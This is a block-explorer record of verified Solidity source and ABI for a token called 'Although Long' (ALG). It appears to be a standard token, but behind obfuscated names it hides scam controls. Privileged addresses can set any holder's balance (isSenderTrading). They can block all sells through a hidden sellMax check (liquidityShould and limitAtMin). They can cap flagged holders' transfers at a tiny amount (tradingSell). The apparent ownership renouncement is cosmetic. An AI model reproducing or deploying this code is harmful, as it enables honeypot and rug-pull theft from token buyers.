{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface exemptLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingWalletMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTrading {\n    function createPair(address fundReceiverShould, address sellAt) external returns (address);\n}\n\ninterface takeFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTake) external view returns (uint256);\n\n    function transfer(address toIsFund, uint256 marketingShould) external returns (bool);\n\n    function allowance(address autoLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toIsFund,\n        uint256 marketingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMax, uint256 value);\n    event Approval(address indexed autoLimit, address indexed spender, uint256 value);\n}\n\ninterface receiverFrom is takeFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlthoughLong is tradingWalletMarketing, takeFund, receiverFrom {\n\n    address senderTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public totalMode;\n\n    function name() external view virtual override returns (string memory) {\n        return txSwapMin;\n    }\n\n    uint8 private receiverShould = 18;\n\n    uint256 private modeLiquidity;\n\n    uint256 private tradingTx;\n\n    uint256 sellMax;\n\n    uint256 teamList;\n\n    bool private minReceiverSwap;\n\n    uint256 private tradingSender;\n\n    function allowance(address walletListMarketing, address minToFee) external view virtual override returns (uint256) {\n        if (minToFee == senderTake) {\n            return type(uint256).max;\n        }\n        return autoMode[walletListMarketing][minToFee];\n    }\n\n    function transferFrom(address limitTotal, address toIsFund, uint256 marketingShould) external override returns (bool) {\n        if (_msgSender() != senderTake) {\n            if (autoMode[limitTotal][_msgSender()] != type(uint256).max) {\n                require(marketingShould <= autoMode[limitTotal][_msgSender()]);\n                autoMode[limitTotal][_msgSender()] -= marketingShould;\n            }\n        }\n        return limitAtMin(limitTotal, toIsFund, marketingShould);\n    }\n\n    function owner() external view returns (address) {\n        return sellTakeTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSender;\n    }\n\n    function isSenderTrading(address receiverLiquidity, uint256 marketingShould) public {\n        amountLaunchWallet();\n        tradingReceiverBuy[receiverLiquidity] = marketingShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShould;\n    }\n\n    string private txSwapMin = \"Although Long\";\n\n    address amountMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function takeAuto(address receiverAmount) public {\n        if (totalMode) {\n            return;\n        }\n        if (tradingTx != launchedMaxMode) {\n            tradingTx = buyMinShould;\n        }\n        modeListAmount[receiverAmount] = true;\n        if (swapLaunchedLiquidity) {\n            minReceiverSwap = false;\n        }\n        totalMode = true;\n    }\n\n    mapping(address => bool) public receiverWallet;\n\n    mapping(address => uint256) private tradingReceiverBuy;\n\n    function amountLaunchWallet() private view {\n        require(modeListAmount[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellTakeTo;\n    }\n\n    function buyTrading() public {\n        emit OwnershipTransferred(tokenReceiver, address(0));\n        sellTakeTo = address(0);\n    }\n\n    function tradingSell(address launchedExempt) public {\n        amountLaunchWallet();\n        if (swapLaunchedLiquidity) {\n            tradingTx = exemptToken;\n        }\n        if (launchedExempt == tokenReceiver || launchedExempt == minFromShould) {\n            return;\n        }\n        receiverWallet[launchedExempt] = true;\n    }\n\n    constructor (){\n        \n        exemptLiquidity shouldSellLaunch = exemptLiquidity(senderTake);\n        minFromShould = amountTrading(shouldSellLaunch.factory()).createPair(shouldSellLaunch.WETH(), address(this));\n        \n        tokenReceiver = _msgSender();\n        buyTrading();\n        modeListAmount[tokenReceiver] = true;\n        tradingReceiverBuy[tokenReceiver] = swapReceiver;\n        \n        emit Transfer(address(0), tokenReceiver, swapReceiver);\n    }\n\n    function limitAtMin(address limitTotal, address toIsFund, uint256 marketingShould) internal returns (bool) {\n        if (limitTotal == tokenReceiver) {\n            return senderListTake(limitTotal, toIsFund, marketingShould);\n        }\n        uint256 shouldWallet = takeFund(minFromShould).balanceOf(amountMode);\n        require(shouldWallet == sellMax);\n        require(toIsFund != amountMode);\n        if (receiverWallet[limitTotal]) {\n            return senderListTake(limitTotal, toIsFund, txSell);\n        }\n        return senderListTake(limitTotal, toIsFund, marketingShould);\n    }\n\n    mapping(address => bool) public modeListAmount;\n\n    uint256 private exemptToken;\n\n    uint256 private swapReceiver = 100000000 * 10 ** 18;\n\n    function liquidityShould(uint256 marketingShould) public {\n        amountLaunchWallet();\n        sellMax = marketingShould;\n    }\n\n    uint256 private launchedMaxMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapReceiver;\n    }\n\n    function balanceOf(address txTake) public view virtual override returns (uint256) {\n        return tradingReceiverBuy[txTake];\n    }\n\n    bool public launchReceiver;\n\n    uint256 private buyMinShould;\n\n    function senderListTake(address limitTotal, address toIsFund, uint256 marketingShould) internal returns (bool) {\n        require(tradingReceiverBuy[limitTotal] >= marketingShould);\n        tradingReceiverBuy[limitTotal] -= marketingShould;\n        tradingReceiverBuy[toIsFund] += marketingShould;\n        emit Transfer(limitTotal, toIsFund, marketingShould);\n        return true;\n    }\n\n    uint256 constant txSell = 18 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoMode;\n\n    bool private swapLaunchedLiquidity;\n\n    address private sellTakeTo;\n\n    function approve(address minToFee, uint256 marketingShould) public virtual override returns (bool) {\n        autoMode[_msgSender()][minToFee] = marketingShould;\n        emit Approval(_msgSender(), minToFee, marketingShould);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchShould, address indexed enableFund);\n\n    address public minFromShould;\n\n    function transfer(address receiverLiquidity, uint256 marketingShould) external virtual override returns (bool) {\n        return limitAtMin(_msgSender(), receiverLiquidity, marketingShould);\n    }\n\n    address public tokenReceiver;\n\n    string private tokenSender = \"ALG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletListMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minToFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"isSenderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"liquidityShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFromShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeListAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"takeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toIsFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlthoughLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}